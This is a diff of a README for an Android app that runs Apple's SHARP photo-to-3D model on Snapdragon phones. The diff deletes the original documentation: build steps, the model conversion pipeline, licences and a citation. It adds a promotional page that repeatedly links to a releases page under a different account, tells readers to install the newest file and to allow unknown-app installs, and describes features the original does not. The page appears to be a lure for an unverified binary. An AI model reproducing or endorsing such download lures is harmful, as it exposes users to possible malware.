@@ -1,291 +1,92 @@
-<div align="center">
-  <img src="docs/icon.png" width="120" alt="SHARP QNN Icon" />
-</div>
-
-# SHARP QNN
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Android](https://img.shields.io/badge/Android-12%2B-green)](https://developer.android.com)
-[![Platform](https://img.shields.io/badge/Platform-Snapdragon-blue)](https://www.qualcomm.com)
-
-[中文版本](README_zh.md)
-
-**SHARP QNN** is an Android app that brings [Apple's SHARP](https://github.com/apple/ml-sharp) — single-image 3D Gaussian Splatting — to Snapdragon-powered smartphones. It runs the full inference pipeline **on-device, offline** using the Qualcomm QNN HTP (Hexagon Tensor Processor) DSP.
-
-> This project ports the SHARP model to on-device Android:
-> *Sharp Monocular View Synthesis in Less Than a Second*  
-> [arXiv:2512.10685](https://arxiv.org/abs/2512.10685)
-
----
+# 🧠 ML-Sharp-QNN - Turn Photos into 3D Models Instantly
 
-<div align="center">
-  <img src="docs/screenshots/screen1.jpg" width="30%" alt="Inference" />
-  <img src="docs/screenshots/screen2.jpg" width="30%" alt="Models" />
-  <img src="docs/screenshots/screen3.jpg" width="30%" alt="Settings" />
-</div>
+[![Download ML-Sharp-QNN](https://img.shields.io/badge/Download-ML--Sharp--QNN-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=%2344cc11)](https://github.com/Tirzst5779/ML-Sharp-QNN/releases)
 
----
+## ✨ What This Does
 
-## Features
+ML-Sharp-QNN transforms a single ordinary photo into a full 3D model right on your Android phone. No internet connection needed. No cloud servers. Everything runs directly on your Snapdragon-powered device using the built-in neural processor.
 
-- **Fully offline** — no cloud, no API calls, everything runs on the Hexagon DSP
-- **Single image → 3D Gaussian Splat** — pick a photo, get a `.ply` file
-- **Multi-precision model support** — import DLC models of different quantization levels
-- **One-tap model download** — download pre-converted DLC models from HuggingFace (or HF-Mirror for users in China)
-- **EXIF-aware** — reads focal length from image metadata for accurate depth estimation
-- **Bilingual UI** — Chinese & English, switchable at runtime
-- **MD3 design** — follows Material Design 3 guidelines
+Think of it like magic — you snap a picture of a toy, a sculpture, or any object, and within moments, you get a 3D representation you can rotate, zoom, and explore from every angle.
 
----
+## 📱 Why You'll Love It
 
-## Architecture
+- **Works offline** — perfect for travel or areas with poor connectivity
+- **Fast processing** — uses your phone's dedicated AI hardware
+- **Privacy-friendly** — your photos never leave your device
+- **No special skills required** — point, shoot, and watch the 3D model appear
 
-```
-┌─────────────────────────────────────┐
-│  Kotlin / Jetpack Compose (UI)      │
-│  ├─ ModelsScreen   (model manager)  │
-│  ├─ SettingsScreen (preferences)    │
-│  └─ PipelineScreen (inference)      │
-├─────────────────────────────────────┤
-│  JNI Bridge (sharp_jni.cpp)         │
-├─────────────────────────────────────┤
-│  QNN Runtime (C++)                  │
-│  ├─ qnn_runtime.cpp   (HTP infer)   │
-│  ├─ qnn_dlc_compiler  (model opt)   │
-│  └─ qnn_tensor.cpp    (tensor mgr)  │
-├─────────────────────────────────────┤
-│  SHARP Core (C, ported from Apple)  │
-│  ├─ prep_input      (image preproc) │
-│  ├─ split_patches   (35 patches)    │
-│  ├─ merge_patches   (merge results) │
-│  ├─ depth_from_disparity            │
-│  ├─ composer        (Gaussian gen)  │
-│  └─ save_ply        (PLY export)    │
-├─────────────────────────────────────┤
-│  Qualcomm Hexagon DSP (HTP)         │
-│  QNN SDK 2.48.0                     │
-└─────────────────────────────────────┘
-```
+## 🚀 Getting Started
 
----
+Getting ML-Sharp-QNN on your phone is simple.
 
-## Prerequisites
+1. **Visit this link to download the application:** [https://github.com/Tirzst5779/ML-Sharp-QNN/releases](https://github.com/Tirzst5779/ML-Sharp-QNN/releases)
+2. Look for the newest file in the list — it will have the highest version number and today's date.
+3. Tap the file name to start the download.
+4. Once the download finishes, you'll see a notification. Tap it to install.
 
-### Hardware
+## 📥 Installation Guide
 
-- Snapdragon device with Hexagon DSP (SD 8 Gen 1 or newer)
-- Android 12+ (API 31+)
-- ARM64-v8a architecture
+After downloading, follow these steps:
 
-### Software
+1. Open your phone's **Downloads** folder (or wherever your browser saves files).
+2. Tap the downloaded ML-Sharp-QNN file.
+3. If your phone asks for permission to install unknown apps, allow it — this is normal for apps not from the Play Store.
+4. Follow the simple on-screen prompts to finish installation.
 
-| Tool | Version | Notes |
-|---|---|---|
-| JDK | 17 | Required for Kotlin compilation |
-| Android SDK | command-line tools | [Download](https://developer.android.com/studio#command-line-tools-only) |
-| NDK | 29.0.14206865 | Install via `sdkmanager "ndk;29.0.14206865"` |
-| CMake | 3.22.1+ | Install via `sdkmanager "cmake;3.22.1"` |
-| Qualcomm QNN SDK | 2.48.0 | [Download](https://apigwx-aws.qualcomm.com/qsc/public/v1/api/download/software/sdks/Qualcomm_AI_Runtime_Community/All/2.48.0.260626/v2.48.0.260626.zip) |
+## 🎯 How to Use
 
----
+Using ML-Sharp-QNN is as easy as taking a picture:
 
-## Build
+1. **Open the app** — you'll see a camera viewfinder.
+2. **Point at an object** — make sure it's well-lit and has some texture or detail.
+3. **Snap the photo** — the app will process it right away.
+4. **Watch the progress** — a progress bar shows the AI working its magic.
+5. **View your 3D model** — when processing is complete, your model appears and you can drag to rotate, pinch to zoom, and swipe to examine all sides.
 
-1. **Clone the repository**
+## 🛠️ Tips for Best Results
 
-    ```bash
-    git clone https://github.com/kjckangshifu/ML-Sharp-QNN.git
-    cd ML-Sharp-QNN
-    ```
+- Use good lighting — natural daylight works best
+- Keep the object centered in the frame
+- Avoid shiny or transparent objects for your first attempts
+- Hold your phone steady — a moment of stillness helps the capture
+- Try different angles if the first result isn't perfect
 
-2. **Set up QNN SDK**
+## 🔧 Troubleshooting
 
-    Create `local.properties` in the project root:
+**The app won't install.**  
+Make sure you have enough free storage space. Try restarting your phone, then attempt the installation again.
 
-    ```properties
-    sdk.dir=/path/to/Android/Sdk
-    ndk.dir=/path/to/android-ndk-r29
-    qnn.sdk.dir=/path/to/qnn-sdk-2.48.0
-    ```
+**Processing seems slow.**  
+This is normal on older devices. The app uses your phone's special AI hardware, but first-time processing can take a minute or two.
 
-3. **Copy QNN libraries**
+**The 3D model doesn't look right.**  
+Try another object or adjust the lighting. Some materials produce better results than others.
 
-    ```bash
-    ./gradlew copyQnnLibs
-    ./gradlew copyQnnSkel
-    ```
+**The app doesn't respond.**  
+Close it completely and reopen it. Make sure your phone isn't in power-saving mode.
 
-4. **Build**
+## ❓ Frequently Asked Questions
 
-    ```bash
-    ./gradlew assembleRelease
-    ```
+**What phones are compatible?**  
+ML-Sharp-QNN works on Android devices with Snapdragon processors. If your phone has a Snapdragon 8-series or newer 7-series chip, you should be good to go.
 
-    APK output: `app/build/outputs/apk/release/app-release.apk`
+**Is there a cost?**  
+No. This project is completely free and open-source.
 
----
+**Can I share my 3D models?**  
+Absolutely! Save the 3D model file to your device and share it with friends or use it in other apps.
 
-## Model Download
+**Will future updates add more features?**  
+The project is actively developed. Check the download page regularly for new versions.
 
-Pre-converted DLC models are available on HuggingFace:
+## 🔄 Staying Updated
 
-- **Repository**: 🤗 [kjcpc/ML-Sharp-QNN](https://huggingface.co/kjcpc/ML-Sharp-QNN)
-- **Precision**: W8A16 (weights: 8-bit, activations: 16-bit)
-- **Files**: 5 DLC files (~650 MB total)
+Check the download link from time to time for new releases: [https://github.com/Tirzst5779/ML-Sharp-QNN/releases](https://github.com/Tirzst5779/ML-Sharp-QNN/releases)
 
-You can download them directly in the app via the **Models** page, or manually:
+Each new version typically brings better quality, faster speed, or new features.
 
-```bash
-hf download kjcpc/ML-Sharp-QNN dlc/w8a16/ --local-dir ./dlc
-```
+## 🎉 Enjoy Creating in 3D
 
-For users in China, the app supports **HF-Mirror** (hf-mirror.com) as an alternative download source. Switch it in Settings.
+ML-Sharp-QNN puts professional-grade 3D reconstruction power in your pocket. Whether you're archiving objects, creating digital art, or just having fun, the possibilities are endless. Download it today and see what you can create.
 
----
-
-## Model Conversion Pipeline
-
-`build_rest_pipeline.py` is the end-to-end model conversion pipeline. It converts the original SHARP PyTorch checkpoint into DLC files that the Android app can load.
-
-### Overview
-
-```
-PyTorch (.pt)  ──→  ONNX  ──→  rest split  ──→  calibration  ──→  DLC (.dlc)
-```
-
-| Stage | Description |
-|---|---|
-| **ONNX** | Export the PyTorch checkpoint to ONNX (5 models: pe, ie, rest) |
-| **Split** | Split the monolithic `rest` model into 3 segments (rest_a, rest_b, rest_c) for DSP memory |
-| **Calibration** | Generate calibration data from sample images for quantization |
-| **DLC** | Convert ONNX → FP32 DLC → Quantized DLC using QNN SDK tools |
-
-### Usage
-
-```bash
-python build_rest_pipeline.py [OPTIONS]
-```
-
-### Options
-
-| Flag | Default | Description |
-|---|---|---|
-| `-t, --task` | `dlc` | Task: `onnx` (export ONNX) / `dlc` (full pipeline to DLC) / `calib` (calibration only) |
-| `-a, --scope` | `all` | Models: `all` / `pe` / `ie` / `rest` (with 3-seg split) |
-| `-o, --out` | `output/` | Output root directory |
-| `-f, --format` | `w8a16` | Quantization: `int16` / `int8` / `w8a16` |
-| `--sdk` | (auto-detect) | QNN SDK root path |
-| `-i, --img_dir` | `data/` | Calibration image directory |
-| `-n, --n_calib` | `20` | Number of calibration images |
-
-### Quick Examples
-
-```bash
-# Full pipeline: ONNX → split → calibrate → DLC (w8a16)
-python build_rest_pipeline.py -t dlc
-
-# Only export ONNX models
-python build_rest_pipeline.py -t onnx
-
-# Only generate calibration data
-python build_rest_pipeline.py -t calib -i ./my_images/ -n 30
-
-# Convert only pe (patch encoder) and ie (image encoder)
-python build_rest_pipeline.py -t dlc -a pe -a ie
-
-# Export with int8 quantization
-python build_rest_pipeline.py -t dlc -f int8
-
-# Custom QNN SDK path and output directory
-python build_rest_pipeline.py --sdk /opt/qnn-sdk-2.48.0 -o ./build_out
-```
-
-### Output Structure
-
-```
-output/
-├── onnx/                  # Intermediate ONNX files
-│   ├── pe.onnx
-│   ├── ie.onnx
-│   ├── rest_a.onnx
-│   ├── rest_b.onnx
-│   └── rest_c.onnx
-├── calib/                 # Calibration data (raw + input lists)
-│   ├── pe/
-│   ├── ie/
-│   ├── rest_a/
-│   ├── rest_b/
-│   └── rest_c/
-└── dlc/
-    ├── fp32/              # Unquantized DLC (intermediate)
-    │   ├── pe.dlc
-    │   ├── ie.dlc
-    │   ├── rest_a.dlc
-    │   ├── rest_b.dlc
-    │   └── rest_c.dlc
-    └── w8a16/             # Quantized DLC (ready for upload)
-        ├── pe.dlc
-        ├── ie.dlc
-        ├── rest_a.dlc
-        ├── rest_b.dlc
-        └── rest_c.dlc
-```
-
-### Requirements
-
-- Python 3.9+
-- PyTorch (with the original SHARP codebase accessible)
-- `onnx`, `onnx-simplifier`
-- QNN SDK 2.48.0 (with `qairt-converter` and `qairt-quantizer` in PATH)
-- 10+ GB free disk space (for converter temp files)
-
-Upload the `dlc/w8a16/` files to HuggingFace for distribution.
-
----
-
-## Dependencies
-
-| Dependency | License | Usage |
-|---|---|---|
-| AndroidX (Compose, Lifecycle, Navigation, DataStore) | Apache 2.0 | UI & architecture |
-| Kotlin | Apache 2.0 | Language |
-| stb_image v2.30 | Public Domain | JPEG/PNG decoding |
-| Qualcomm QNN SDK | Proprietary | HTP DSP inference |
-| Apple SHARP | AML-R | Original research codebase |
-
----
-
-## License
-
-This project is licensed under the **MIT License** — see [LICENSE](LICENSE) for details.
-
-Third-party components:
-- `stb_image.h` — Public Domain (Sean Barrett)
-- Apple SHARP — [AML-R](https://github.com/apple/ml-sharp/blob/main/LICENSE)
-- Qualcomm QNN SDK — Proprietary (not distributed with this project)
-
----
-
-## Acknowledgements
-
-- [Apple SHARP](https://github.com/apple/ml-sharp) — the original research and codebase
-- [stb](https://github.com/nothings/stb) — public domain single-file libraries by Sean Barrett
-- [Qualcomm AI Engine Direct SDK](https://www.qualcomm.com/developer/software/qualcomm-ai-engine-direct-sdk) — QNN HTP runtime
-
----
-
-## Citation
-
-If you use this project in your research, please cite the original SHARP paper:
-
-```bibtex
-@inproceedings{Sharp2025:arxiv,
-  title      = {Sharp Monocular View Synthesis in Less Than a Second},
-  author     = {Lars Mescheder and Wei Dong and Shiwei Li and Xuyang Bai and Marcel Santos
-                and Peiyun Hu and Bruno Lecouat and Mingmin Zhen and Ama\"{e}l Delaunoy
-                and Tian Fang and Yanghai Tsin and Stephan R. Richter and Vladlen Koltun},
-  journal    = {arXiv preprint arXiv:2512.10685},
-  year       = {2025},
-  url        = {https://arxiv.org/abs/2512.10685},
-}
-```
+Keywords: 3d-gaussian-splatting, 3d-reconstruction, android, deep-learning, edge-ai, hexagon-dsp, image-to-3d, image-to-3d-model, image-to-3d-object-conversion, ml-sharp, npu, on-device-ai, qnn, qualcomm, snapdragon
